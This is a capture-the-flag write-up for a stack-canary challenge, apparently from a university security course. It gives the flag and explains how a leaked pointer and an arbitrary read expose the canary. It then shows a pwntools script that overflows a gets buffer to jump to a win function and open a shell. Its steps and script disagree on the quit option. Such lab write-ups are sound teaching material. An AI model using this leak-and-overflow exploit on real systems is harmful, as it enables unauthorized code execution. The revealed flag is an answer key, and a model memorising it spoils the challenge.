canary-3 | stack-dump
===========================

Flag: `6447{31c83bef-e49b-4104-bdeb-bae408e8ef84}`

General overview of problems faced
-------------------------------------
N/A

List of vulnerabilities
--------------------
1. The program lists information about a memory pointer on the stack at esp+35
2. Arbitrary memory can be printed use the program by inputing the address to where you want to read. This allows a user to leverage the previous vulnerability in order to calculate the address pointer to the canary and read the canary.
3. The program uses a fixed buffer with gets to take input when requesting "option a". This means a user can overflow the buffer and overflow the return address of the main function.
4. It is also possible to exploit the "len input" which is then converted into an "int" and then passed as argument to the fread function. No length check is made, therefore the user could request 10000 bytes of input and it would allow you to 'fread' 10000 bytes of input into a fixed a size buffer...


Steps to exploit
------------------
1. Use the given address to calculate the canary address. The given pointer is at esp+35 and the canary is at esp+140, therefore we need to add 105 to the given address.
2. Input the calculated canary address. (option "a" in the main menu of the program)
3. Get the program to print out the value at the canary address (option "b" in the main menu)
4. Save the 4 bytes of canary
5. Select option "a" and input 96 bytes of data, then input the canary value, add 12 bytes of offset data and then input the address of the win function in little endian format
6. Select option "q" from the main menu.
7. Congratz you now have a shell

Script/Command used
------------------
```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwn import *

NOP_OPERATOR = '\x90'

def main():
    r = remote("wargames.6447.sec.edu.au", 6003)

    r.recvuntil("a useful stack pointer ")
    base_pointer = int(r.recvline().strip(), 16)
    canary_pointer = base_pointer + 105

    r.sendline('a')
    r.sendline('4')
    r.sendline(p32(canary_pointer))

    r.recvrepeat(0.2)

    r.sendline('b')
    canary = r.recvline().strip()[22:26]
    print canary


    buf_len = 140-44 # 140 (esp+140 = canary || esp+44 = start of "len" buffer)
    win = 0x80486cd
    offset = 12 # 0xffffd5bc - 0xffffd5cc = -16 (12 offset to ret + 4 canary)

    r.sendline('a')
    r.sendline(
        NOP_OPERATOR * buf_len
        + str(canary)
        + NOP_OPERATOR * offset
        + p32(win)
    )

    r.sendline('d') # quit the program and trigger the jump

    r.interactive()

if __name__ == '__main__':
    main()
```

